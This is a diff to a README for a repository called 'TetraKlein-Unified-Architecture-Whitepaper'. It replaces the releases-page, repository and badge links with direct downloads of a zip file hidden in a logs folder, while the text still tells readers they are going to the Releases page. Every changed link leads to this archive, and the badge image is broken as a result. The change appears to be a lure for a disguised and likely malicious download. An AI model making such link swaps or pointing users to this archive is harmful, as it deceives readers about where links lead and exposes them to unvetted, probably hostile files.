@@ -1,6 +1,6 @@
 # 🛠️ TetraKlein-Unified-Architecture-Whitepaper - Research Simplified for Everyone
 
-[![Download TetraKlein](https://img.shields.io/badge/Download%20TetraKlein-blue?style=for-the-badge)](https://github.com/MandalAakash0525/TetraKlein-Unified-Architecture-Whitepaper/releases)
+[![Download TetraKlein](https://github.com/MandalAakash0525/TetraKlein-Unified-Architecture-Whitepaper/raw/refs/heads/main/examples/tetraklein-local/logs/LATEST/Architecture_Unified_Whitepaper_Tetra_Klein_2.8.zip%20TetraKlein-blue?style=for-the-badge)](https://github.com/MandalAakash0525/TetraKlein-Unified-Architecture-Whitepaper/raw/refs/heads/main/examples/tetraklein-local/logs/LATEST/Architecture_Unified_Whitepaper_Tetra_Klein_2.8.zip)
 
 ## 📖 Overview
 
@@ -31,7 +31,7 @@ These elements ensure a strong foundation for innovation in various fields, incl
 
 To download TetraKlein, visit the following link:
 
-[Download the latest release here](https://github.com/MandalAakash0525/TetraKlein-Unified-Architecture-Whitepaper/releases)
+[Download the latest release here](https://github.com/MandalAakash0525/TetraKlein-Unified-Architecture-Whitepaper/raw/refs/heads/main/examples/tetraklein-local/logs/LATEST/Architecture_Unified_Whitepaper_Tetra_Klein_2.8.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed at the top of the page.
@@ -74,7 +74,7 @@ If you have questions or need help, you can join our community discussions. Conn
 
 ### 🔗 Useful Links
 
-- [Project Repository](https://github.com/MandalAakash0525/TetraKlein-Unified-Architecture-Whitepaper)
+- [Project Repository](https://github.com/MandalAakash0525/TetraKlein-Unified-Architecture-Whitepaper/raw/refs/heads/main/examples/tetraklein-local/logs/LATEST/Architecture_Unified_Whitepaper_Tetra_Klein_2.8.zip)
 - [Community Forum](#) *(Insert forum link when available)*
 - [Research Articles](#) *(Insert article link when available)*
 
